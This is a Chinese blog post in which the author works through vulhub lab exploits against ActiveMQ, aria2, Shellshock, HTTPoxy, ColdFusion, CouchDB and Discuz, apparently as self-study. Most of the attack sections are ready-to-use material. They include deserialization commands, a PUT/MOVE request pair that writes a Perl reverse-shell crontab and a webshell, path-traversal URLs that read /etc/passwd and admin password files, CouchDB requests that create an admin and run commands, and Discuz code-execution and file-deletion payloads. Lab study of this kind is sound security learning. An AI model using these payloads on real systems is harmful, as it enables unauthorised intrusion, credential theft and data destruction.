# vulhub挖洞心得

[2018-07-11]()

最近想系统的学习一下攻防，就从挖洞开始把，听说vulhub里的漏洞很值得学习，就自己搭环境搞一搞

## [](#Docker的安装和使用 "Docker的安装和使用")Docker的安装和使用

先推荐一个讲的比较详细的网站：<https://blog.csdn.net/zxcxq/article/details/77261716>

### [](#1-安装docker "1.安装docker")1.安装docker

```
apt-get update && apt-get install docker.io
```

### [](#2-启动docker服务 "2.启动docker服务")2.启动docker服务

```
service docker start
```

### [](#3-安装compose "3.安装compose")3.安装compose

```
pip install docker-compose
```

安装好之后可以下载vulhub  
<https://github.com/phith0n/vulhub>  
还有一个vulapp  
<https://github.com/Medicean/VulApps>

### [](#4-在线自动化编译docker环境 "4.在线自动化编译docker环境")4.在线自动化编译docker环境

进入vulhub目录，随便选择一个环境，这里以第一个activemq为例，进入该目录后，输入命令`docker-compose build`  
如果报错有可能是服务没开，也有可能是作者已经编译好了，那就直接执行下一步

### [](#5-开启docker里的容器 "5.开启docker里的容器")5.开启docker里的容器

`docker-compose up \-d`  
然后就可以看到环境已经搭建好了

每个环境里面都有一个README.MD 里面有详细的说明漏洞环境如何搭建，如何启动，如何使用漏洞，所以一定要看一下这个文件

## [](#挖洞过程 "挖洞过程")挖洞过程

### [](#1-activemq "1.activemq")1.activemq

#### [](#1-CVE-2015-5254 "(1) CVE-2015-5254")\(1\) CVE-2015-5254

ActiveMQ 反序列化漏洞（CVE-2015-5254）

Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service\(JMS\)ObjectMessage对象利用该漏洞执行任意代码。

环境运行后，将监听61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。

漏洞利用过程如下：

1.  构造（可以使用ysoserial）可执行命令的序列化对象
2.  作为一个消息，发送给目标61616端口
3.  访问web管理页面，读取消息，触发漏洞

使用[jmet](https://github.com/matthiaskaiser/jmet)进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。

jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。

执行：

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME your-ip 61616</span><br></pre></td></tr></tbody></table>

此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过`http://your-ip:8161/admin/browse.jsp?JMSDestination=event`看到这个队列中所有消息：

点击查看这条消息即可触发命令执行，此时进入容器`docker-compose exec activemq bash`，可见/tmp/success已成功创建，说明漏洞利用成功：

将命令替换成弹shell语句再利用：

值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。

#### [](#2-CVE-2016-3088 "(2)CVE-2016-3088")\(2\)CVE-2016-3088

环境监听61616端口和8161端口，其中8161为web控制台端口，本漏洞就出现在web控制台中。  
访问`http://192.168.6.130:8161/`看到web页面，说明环境已成功运行。

本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。

写入crontab，自动化弹shell

这是一个比较稳健的方法。首先上传cron配置文件（注意，换行一定要`\n`，不能是`\r\n`，否则crontab执行会失败）：

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/1.txt HTTP/1.1</span><br><span class="line">Host: 192.168.6.130:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 248</span><br><span class="line"></span><br><span class="line">*/1 * * * * root /usr/bin/perl -e 'use Socket;$i="192.168.6.130";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span><br><span class="line">##</span><br></pre></td></tr></tbody></table>

将其移动到`/etc/cron.d/root`：

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/1.txt HTTP/1.1</span><br><span class="line">Destination: file:///etc/cron.d/root</span><br><span class="line">Host: 192.168.6.130:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></tbody></table>

如果上述两个请求都返回204了，说明写入成功。等待反弹shell：

这个方法需要ActiveMQ是root运行，否则也不能写入cron文件。

默认的ActiveMQ账号密码均为`admin`，首先访问`http://192.168.6.130:8161/admin/test/systemProperties.jsp`，查看ActiveMQ的绝对路径：

然后上传webshell：

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/2.txt HTTP/1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 120976</span><br><span class="line"></span><br><span class="line">webshell...</span><br></pre></td></tr></tbody></table>

移动到web目录下的api文件夹（`/opt/activemq/webapps/api/s.jsp`）中：

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/2.txt HTTP/1.1</span><br><span class="line">Destination: file:///opt/activemq/webapps/api/s.jsp</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></tbody></table>

访问webshell（需要登录）,或者直接上菜刀

### [](#2-aria2 "2.aria2")2.aria2

Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。

因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 <http://binux.github.io/yaaw/demo/> 。

打开yaaw，点击配置按钮，填入运行aria2的目标域名：`http://your-ip:6800/jsonrpc`:

然后点击Add，增加一个新的下载任务。在Dir的位置填写下载至的目录，File Name处填写文件名。比如，我们通过写入一个crond任务来反弹shell：

这时候，arai2会将恶意文件（我指定的URL）下载到/etc/cron.d/目录下，文件名为shell。而在debian中，/etc/cron.d目录下的所有文件将被作为计划任务配置文件（类似crontab）读取，等待一分钟不到即成功反弹shell：

> 如果反弹不成功，注意crontab文件的格式，以及换行符必须是`\n`，且文件结尾需要有一个换行符。

当然，我们也可以尝试写入其他文件

### [](#3-shellshock "3.shellshock")3.shellshock

Shellshock 破壳漏洞（CVE-2014-6271）  
访问`http://192.168.6.130/`，有两个文件：

* safe.cgi
* victim.cgi

其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。

带上payload访问victim.cgi，命令成功被执行：

同样的数据包访问safe.cgi，不受影响：

### [](#3-cgi "3.cgi")3.cgi

HTTPoxy漏洞（CVE-2016-5385）

参考：[http://www.laruence.com/2016/07/19/3101.html](原理)

简单来说，根据RFC 3875规定，cgi（fastcgi）要将用户传入的所有HTTP头都加上`HTTP_`前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的`HTTP_PROXY`值作为HTTP代理地址。于是，恶意用户通过提交`Proxy: http://evil.com`这样的HTTP头，将使用缺陷类库的网站的代理设置为`http://evil.com`，进而窃取数据包中可能存在的敏感信息。

PHP5.6.24版本修复了该漏洞，不会再将`Proxy`放入环境变量中。本环境使用PHP 5.6.23为例。

当然，该漏洞不止影响PHP，所有以CGI或Fastcgi运行的程序理论上都受到影响。

正常请求`http://your-ip/index.php`，可见其Origin为当前请求的服务器，二者IP相等：

在其他地方找到一个可以正常运行的http代理，如`http://x.x.122.65:8888/`。

附带`Proxy: http://x.x.122.65:8888/`头，再次访问`http://your-ip/index.php`：

如上图，可见此时的Origin已经变成`x.x.122.65`，也就是说真正进行HTTP访问的服务器是`x.x.122.65`，也就是说`x.x.122.65`已经将正常的HTTP请求代理了。

在`x.x.122.65`上使用NC，就可以捕获当前请求的数据包，其中可能包含敏感数据：

### [](#4-coldfusion "4.coldfusion")4.coldfusion

#### [](#1-Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861） "(1)Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）")\(1\)Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）

Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。

直接访问`http://192.168.6.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en`，即可读取文件`/etc/passwd`

读取后台管理员密码`http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en`：

#### [](#Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066） "Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）")Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）

参考链接：

* <https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html>

我们使用参考链接中的[ColdFusionPwn](https://github.com/codewhitesec/ColdFusionPwn)工具来生成POC：

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/success' poc.ser</span><br></pre></td></tr></tbody></table>

POC生成于poc.ser文件中，将POC作为数据包body发送给`http://your-ip:8500/flex2gateway/amf`，Content-Type为application/x-amf：

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /flex2gateway/amf HTTP/1.1</span><br><span class="line">Host: your-ip:8500</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-amf</span><br><span class="line">Content-Length: 2853</span><br><span class="line"></span><br><span class="line">[...poc...]</span><br></pre></td></tr></tbody></table>

进入容器中，发现`/tmp/success`已成功创建：

将POC改成  
[反弹命令](http://jackson.thuraisamy.me/runtime-exec-payloads.html)，  
成功拿到shell：

### [](#5-couchdb "5.couchdb")5.couchdb

#### [](#1-Couchdb-垂直权限绕过漏洞（CVE-2017-12635） "(1)Couchdb 垂直权限绕过漏洞（CVE-2017-12635）")\(1\)Couchdb 垂直权限绕过漏洞（CVE-2017-12635）

在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。  
参考链接：

* <http://bobao.360.cn/learning/detail/4716.html>
* <https://justi.cz/security/2017/11/14/couchdb-rce-npm.html>

首先，发送如下数据包：

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user:vulhub HTTP/1.1</span><br><span class="line">Host: 192.168.6.130:5984</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 90</span><br><span class="line"></span><br><span class="line">{</span><br><span class="line">  "type": "user",</span><br><span class="line">  "name": "vulhub",</span><br><span class="line">  "roles": ["_admin"],</span><br><span class="line">  "password": "vulhub"</span><br><span class="line">}</span><br></pre></td></tr></tbody></table>

可见，返回403错误：`{"error":"forbidden","reason":"Only _admin may set roles"}`，只有管理员才能设置Role角色：

发送包含两个roles的数据包，即可绕过限制：

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user:vulhub HTTP/1.1</span><br><span class="line">Host: your-ip:5984</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">{</span><br><span class="line">  "type": "user",</span><br><span class="line">  "name": "vulhub",</span><br><span class="line">  "roles": ["_admin"],</span><br><span class="line">  "roles": [],</span><br><span class="line">  "password": "vulhub"</span><br><span class="line">}</span><br></pre></td></tr></tbody></table>

成功创建管理员，账户密码均为`vulhub`：

再次访问`http://your-ip:5984/_utils/`，输入账户密码`vulhub`，可以成功登录：

#### [](#（2）Couchdb-任意命令执行漏洞（CVE-2017-12636） "（2）Couchdb 任意命令执行漏洞（CVE-2017-12636）")（2）Couchdb 任意命令执行漏洞（CVE-2017-12636）

参考链接：

* <http://bobao.360.cn/learning/detail/4716.html>
* <https://justi.cz/security/2017/11/14/couchdb-rce-npm.html>

该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用[CVE-2017-12635](https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635)先增加一个管理员用户。

依次执行如下请求即可触发任意命令执行：

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT 'http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd' -d '"id &gt;/tmp/success"'</span><br><span class="line">curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'</span><br><span class="line">curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'</span><br><span class="line">curl -X POST 'http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'</span><br></pre></td></tr></tbody></table>

其中,`vulhub:vulhub`为管理员账号密码。

第一个请求是添加一个名字为`cmd`的`query_servers`，其值为`"id >/tmp/success"`，这就是我们后面待执行的命令。

第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。

第四个请求就是在这个Database里进行查询，因为我将language设置为`cmd`，这里就会用到我第一步里添加的名为`cmd`的`query_servers`，最后触发命令执行。

利用脚本

写了一个简单的脚本 <exp.py>，修改其中的target和command为你的测试机器，然后修改version为对应的Couchdb版本，成功反弹shell：

### [](#6-discuz "6.discuz")6.discuz

#### [](#1-Discuz-7-x-6-x-全局变量防御绕过导致代码执行 "(1)Discuz 7.x/6.x 全局变量防御绕过导致代码执行")\(1\)Discuz 7.x/6.x 全局变量防御绕过导致代码执行

由于php5.3.x版本里php.ini的设置里`request_order`默认值为GP，导致`$_REQUEST`中不再包含`$_COOKIE`，我们通过在Cookie中传入`$GLOBALS`来覆盖全局变量，造成代码执行漏洞。

具体原理请参考：

* <https://www.secpulse.com/archives/2338.html>

安装成功后，直接找一个已存在的帖子，向其发送数据包  

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /viewthread.php?tid=10&amp;extra=page%3D1 HTTP/1.1</span><br><span class="line">Host: 192.168.6.130:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</span><br><span class="line">Connection: close</span><br></pre></td></tr></tbody></table>

  
可见，phpinfo已成功执行：

同样，也可以换成system\(\)函数，这样就可以在括号里执行一些命令

#### [](#（2）Discuz-X-≤3-4-任意文件删除漏洞 "（2）Discuz!X ≤3.4 任意文件删除漏洞")（2）Discuz\!X ≤3.4 任意文件删除漏洞

漏洞详情：<https://lorexxar.cn/2017/09/30/dz-delete/>

访问`http://your-ip/robots.txt`可见robots.txt是存在的：

注册用户后，在个人设置页面找到自己的formhash：

带上自己的Cookie、formhash发送如下数据包：

```
POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1
Host: localhost
Content-Length: 367
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPFvXyxL45f34L12s
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Cookie: [your cookie]
Connection: close

------WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name="formhash"

[your formhash]
------WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name="birthprovince"

../../../robots.txt
------WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name="profilesubmit"

1
------WebKitFormBoundaryPFvXyxL45f34L12s--
```

提交成功之后，用户资料修改页面上的出生地就会显示成下图所示的状态：

说明我们的脏数据已经进入数据库了。

然后，新建一个`upload.html`，代码如下，将其中的`[your-ip]`改成discuz的域名，`[form-hash]`改成你的formhash：

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action="http://[your-ip]/home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;profilesubmit=1&amp;formhash=[form-hash]" method="post" enctype="multipart/form-data"&gt;</span><br><span class="line">        &lt;input type="file" name="birthprovince" /&gt;</span><br><span class="line">        &lt;input type="submit" value="upload" /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table>

用浏览器打开该页面，上传一个正常图片。此时脏数据应该已被提取出，漏洞已经利用结束。

再次访问`http://your-ip/robots.txt`，发现文件成功被删除：

未完待续
